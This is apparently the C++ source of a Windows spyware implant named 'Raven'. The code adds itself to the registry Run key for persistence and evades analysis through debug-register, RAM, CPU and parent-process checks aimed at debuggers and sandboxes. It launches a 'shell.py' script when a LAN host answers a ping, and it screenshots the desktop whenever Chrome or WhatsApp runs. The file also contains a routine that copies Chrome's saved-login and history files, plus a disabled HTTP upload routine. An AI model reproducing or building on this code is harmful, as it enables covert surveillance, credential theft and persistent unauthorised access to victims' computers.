#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include<iostream>
#include <chrono>
#include <thread>
#include<ctime>
#include<TlHelp32.h>
#include <string>
#include <gdiplus.h>
#include <tchar.h>
#include <filesystem>
#include<sstream>



bool pingIP(const std::string& ip) {
    std::string command = "ping -c 1 " + ip ;

    int result = system(command.c_str());

    if(!result){
        return true;
    }
    return false;
}


void RunPython() {
    std::string command = "python .\\shell.py";
    system(command.c_str());
}



std::wstring StringToWString(const std::string& s) {
    int len;
    int slength = (int)s.length() + 1;
    len = MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, 0, 0);
    std::wstring r(len, L'\0');
    MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, &r[0], len);
    return r;
}

namespace fs = std::filesystem;

std::wstring GenerateTimestampedFilename() {
    std::time_t now = std::time(nullptr);
    std::tm* localTime = std::localtime(&now);

    std::wostringstream filename;
    filename << L"screenshot_"
        << (localTime->tm_year + 1900) << L"-"
        << std::setw(2) << std::setfill(L'0') << (localTime->tm_mon + 1) << L"-"
        << std::setw(2) << std::setfill(L'0') << localTime->tm_mday << L"_"
        << std::setw(2) << std::setfill(L'0') << localTime->tm_hour << L"-"
        << std::setw(2) << std::setfill(L'0') << localTime->tm_min << L"-"
        << std::setw(2) << std::setfill(L'0') << localTime->tm_sec
        << L".png";

    return filename.str();
}

int screenshotCounter = 0;

std::wstring GenerateIncrementedFilename() {
    std::wostringstream filename;
    filename << L"screenshot_" << screenshotCounter++ << L".png";
    return filename.str();
}



DWORD GetParentPID(DWORD pid)
{
    DWORD ppid = 0;
    PROCESSENTRY32W processEntry = { 0 };
    processEntry.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Process32FirstW(hSnapshot, &processEntry))
    {
        do
        {
            if (processEntry.th32ProcessID == pid)
            {
                ppid = processEntry.th32ParentProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &processEntry));
    }
    CloseHandle(hSnapshot);
    return ppid;
}

//bool isinternetconnected() {
//  
//#ifdef _win32
//    int result = system("ping -n 1 -w 1000 8.8.8.8 > nul");
//#else
//    int result = system("ping -c 1 -w 1 8.8.8.8 > /dev/null");
//#endif
//    return result == 0;
//}

#pragma comment(lib, "winhttp.lib")
//
//bool uploadfile(const std::wstring& url, const std::wstring& filepath) {
//    hinternet hsession = winhttpopen(l"a winhttp example program/1.0", winhttp_access_type_default_proxy, winhttp_no_proxy_name, winhttp_no_proxy_bypass, 0);
//    if (!hsession) return false;
//
//    url_components urlcomp;
//    memset(&urlcomp, 0, sizeof(urlcomp));
//    urlcomp.dwstructsize = sizeof(urlcomp);
//
//    wchar_t hostname[256];
//    wchar_t urlpath[1024];
//    urlcomp.lpszhostname = hostname;
//    urlcomp.dwhostnamelength = sizeof(hostname) / sizeof(hostname[0]);
//    urlcomp.lpszurlpath = urlpath;
//    urlcomp.dwurlpathlength = sizeof(urlpath) / sizeof(urlpath[0]);
//
//    winhttpcrackurl(url.c_str(), url.length(), 0, &urlcomp);
//
//    hinternet hconnect = winhttpconnect(hsession, urlcomp.lpszhostname, urlcomp.nport, 0);
//    if (!hconnect) return false;
//
//    hinternet hrequest = winhttpopenrequest(hconnect, l"post", urlcomp.lpszurlpath, null, winhttp_no_referer, winhttp_default_accept_types, 0);
//    if (!hrequest) return false;
//
//    // read the file content
//    std::ifstream file(filepath, std::ios::binary);
//    if (!file) return false;
//
//    std::vector<char> buffer((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
//
//    bool bresults = winhttpsendrequest(hrequest,
//        winhttp_no_additional_headers, 0,
//        &buffer[0], buffer.size(),
//        buffer.size(), 0);
//    if (bresults) {
//        bresults = winhttpreceiveresponse(hrequest, null);
//    }
//
//    winhttpclosehandle(hrequest);
//    winhttpclosehandle(hconnect);
//    winhttpclosehandle(hsession);
//
//    return bresults == true;
//}

std::string getUserHomeDirectory() {
    char* homeDir = nullptr;
    size_t len = 0;
    _dupenv_s(&homeDir, &len, "USERPROFILE"); // Windows
    return homeDir;
}

void backupFile(const fs::path& source, const fs::path& destination) {
        fs::copy_file(source, destination, fs::copy_options::overwrite_existing);
    
}

void backupChromeData() {
    std::string homeDir = getUserHomeDirectory();
    fs::path chromeHistoryPath = fs::path(homeDir) / "AppData" / "Local" / "Google" / "Chrome" / "User Data" / "Default" / "History";
    fs::path chromeLoginDataPath = fs::path(homeDir) / "AppData" / "Local" / "Google" / "Chrome" / "User Data" / "Default" / "Login Data";

    fs::path exePath = fs::current_path();
    fs::path historyBackupPath = exePath / "History_Backup";
    fs::path loginDataBackupPath = exePath / "LoginData_Backup";

    backupFile(chromeHistoryPath, historyBackupPath);
    backupFile(chromeLoginDataPath, loginDataBackupPath);
}

bool AddToStartup(const std::string& appName, const std::string& appPath) {
    HKEY hKey;
    LONG result = RegOpenKeyEx(HKEY_CURRENT_USER,
        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        0,
        KEY_SET_VALUE,
        &hKey);
    if (result != ERROR_SUCCESS) {
        return false;
    }

    std::wstring wAppName = StringToWString(appName);
    std::wstring wAppPath = StringToWString(appPath);

    result = RegSetValueEx(hKey,
        wAppName.c_str(),
        0,
        REG_SZ,
        (BYTE*)wAppPath.c_str(),
        (wAppPath.size() + 1) * sizeof(wchar_t));
    if (result != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return false;
    }

    RegCloseKey(hKey);
    return true;
}





void gdiscreen() {
    // Get the screen dimensions 
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);

    // Create a device context compatible with the screen 
    HDC hdcScreen = GetDC(NULL);

    // Create a memory device context compatible with the screen DC 
    HDC hdcMem = CreateCompatibleDC(hdcScreen);

    // Create a compatible bitmap and select it into the memory device context 
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
    HBITMAP hOldBitmap = (HBITMAP)SelectObject(hdcMem, hBitmap);

    // Copy the screen contents to the bitmap 
    BitBlt(hdcMem, 0, 0, width+200, height+200, hdcScreen, 0, 0, SRCCOPY);

    // Clean up 
    SelectObject(hdcMem, hOldBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);

    // Now hBitmap contains the screenshot
    // You can save it to a file or do other processing here
}

#pragma comment (lib, "Gdiplus.lib")

using namespace Gdiplus;

void InitializeGDIPlus(ULONG_PTR& gdiplusToken) {
    GdiplusStartupInput gdiplusStartupInput;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, nullptr);
}

int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0;
    UINT size = 0;
    ImageCodecInfo* pImageCodecInfo = nullptr;

    GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;

    pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
    if (pImageCodecInfo == nullptr) return -1;

    GetImageEncoders(num, size, pImageCodecInfo);
    for (UINT j = 0; j < num; ++j) {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }
    }

    free(pImageCodecInfo);
    return -1;
}

void CaptureScreenAndSave(const WCHAR* filename) {
    // Get the device context of the screen
    HDC hScreenDC = GetDC(nullptr);
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);

    // Get the screen dimensions
    int screenX = GetSystemMetrics(SM_CXSCREEN);
    int screenY = GetSystemMetrics(SM_CYSCREEN);

    // Create a compatible bitmap and select it into the memory device context
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, screenX, screenY);
    HGDIOBJ hOldBitmap = SelectObject(hMemoryDC, hBitmap);

    // Copy the screen to the memory device context
    BitBlt(hMemoryDC, 0, 0, screenX, screenY, hScreenDC, 0, 0, SRCCOPY);

    // Initialize GDI+ token
    ULONG_PTR gdiplusToken;
    InitializeGDIPlus(gdiplusToken);

    // Save the bitmap using GDI+
    {
        Bitmap bitmap(hBitmap, nullptr);
        CLSID clsid;
        GetEncoderClsid(L"image/png", &clsid);
        bitmap.Save(filename, &clsid, nullptr);
    }

    // Clean up
    SelectObject(hMemoryDC, hOldBitmap);
    DeleteObject(hBitmap);
    DeleteDC(hMemoryDC);
    ReleaseDC(nullptr, hScreenDC);

    // Shutdown GDI+
    GdiplusShutdown(gdiplusToken);
}

bool CheckForSession__G() {
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;

    // Take a snapshot of all processes in the system.
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        return false;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    // Retrieve information about the first process.
    if (!Process32First(hProcessSnap, &pe32)) {
        CloseHandle(hProcessSnap);
        return false;
    }

    // Now walk the snapshot of processes and display information about each process.
    bool chromeFound = false;
    do {
        if (_tcsicmp(pe32.szExeFile, _T("Chrome.exe")) == 0) {
            CloseHandle(hProcessSnap);
            return true;
        }
    } while (Process32Next(hProcessSnap, &pe32));

    if (!chromeFound) {
        CloseHandle(hProcessSnap);
        return false;
    }

    CloseHandle(hProcessSnap);
}

bool CheckForSession__W() {
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;

    // Take a snapshot of all processes in the system.
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        return false;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    // Retrieve information about the first process.
    if (!Process32First(hProcessSnap, &pe32)) {
        CloseHandle(hProcessSnap);
        return false;
    }

    // Now walk the snapshot of processes and display information about each process.
    bool chromeFound = false;
    do {
        if (_tcsicmp(pe32.szExeFile, _T("WhatsApp.exe")) == 0) {
            CloseHandle(hProcessSnap);
            return true;
        }
    } while (Process32Next(hProcessSnap, &pe32));

    if (!chromeFound) {
        CloseHandle(hProcessSnap);
        return false;
    }

    CloseHandle(hProcessSnap);
}
//g++ -o Raven.exe RAVEN.cpp -lwinhttp

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {

    std::string appName = "Raven"; // The name to appear in the registry
    std::string appPath = "C:\\Users\\Public\\WindowsData\\RAVEN.exe"; // Full path to your application
    AddToStartup(appName, appPath);
    CONTEXT context = {};
    context.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    GetThreadContext(GetCurrentThread(), &context);
    if (context.Dr0 || context.Dr1 || context.Dr2 || context.Dr3) return 0;


    //RAM
    MEMORYSTATUSEX memoryStatus;
    memoryStatus.dwLength = sizeof(memoryStatus);
    GlobalMemoryStatusEx(&memoryStatus);
    DWORD RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024;
    if (RAMMB < 2048) return 0;
    //CPU
    SYSTEM_INFO systemInfo;
    GetSystemInfo(&systemInfo);
    DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
    if (numberOfProcessors < 2)
        return 0;



    //Check for Parent process; Incase it's started By a Debugger
    DWORD parentPid = GetParentPID(GetCurrentProcessId());
    WCHAR parentName[MAX_PATH + 1];
    DWORD dwParentName = MAX_PATH;
    HANDLE hParent = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, parentPid);
    QueryFullProcessImageNameW(hParent, 0, parentName, &dwParentName); // another way to get process name is to use 'Toolhelp32Snapshot'
    CharUpperW(parentName);
    if (wcsstr(parentName, L"WINDBG.EXE")) return 0;
    if (wcsstr(parentName, L"SAMPLE.EXE")) return 0;

    bool _STATUS_ = false;

    while (true) {

        auto current_time = std::chrono::system_clock::now();
        auto next_run_time = current_time + std::chrono::minutes(2);
        if (pingIP("192.168.100.11") && _STATUS_ == false) {

            std::thread pythonThread(RunPython);
            pythonThread.detach();
            _STATUS_ = true;

        }
        std::this_thread::sleep_until(next_run_time);
        //backupChromeData();
        bool _G_status = CheckForSession__G();
        bool _W_status = CheckForSession__W();
        if (_G_status || _W_status) {
            CaptureScreenAndSave(GenerateTimestampedFilename().c_str());
        }
        

    }
}
